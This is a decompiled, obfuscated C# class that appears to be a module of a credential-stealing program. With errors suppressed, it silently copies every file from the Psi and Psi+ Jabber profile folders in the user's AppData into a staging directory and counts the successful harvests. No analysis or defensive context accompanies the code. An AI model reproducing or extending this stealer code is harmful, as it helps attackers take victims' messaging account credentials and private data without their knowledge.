using System;
using System.IO;
using Moist;

// Token: 0x02000050 RID: 80
internal class Class19
{
	// Token: 0x06000226 RID: 550 RVA: 0x000110E0 File Offset: 0x0000F2E0
	public static void smethod_0(string string_0)
	{
		try
		{
			foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppDate + "\\Psi+\\profiles\\default\\").GetFiles())
			{
				Directory.CreateDirectory(string_0 + "\\Jabber\\Psi+\\profiles\\default\\");
				fileInfo.CopyTo(string_0 + "\\Jabber\\Psi+\\profiles\\default\\" + fileInfo.Name);
			}
			Class20.int_0++;
		}
		catch
		{
		}
		try
		{
			foreach (FileInfo fileInfo2 in new DirectoryInfo(Help.AppDate + "\\Psi\\profiles\\default\\").GetFiles())
			{
				Directory.CreateDirectory(string_0 + "\\Jabber\\Psi\\profiles\\default\\");
				fileInfo2.CopyTo(string_0 + "\\Jabber\\Psi\\profiles\\default\\" + fileInfo2.Name);
			}
			Class20.int_0++;
		}
		catch
		{
		}
	}

	// Token: 0x06000227 RID: 551 RVA: 0x0000446C File Offset: 0x0000266C
	public Class19()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}
}
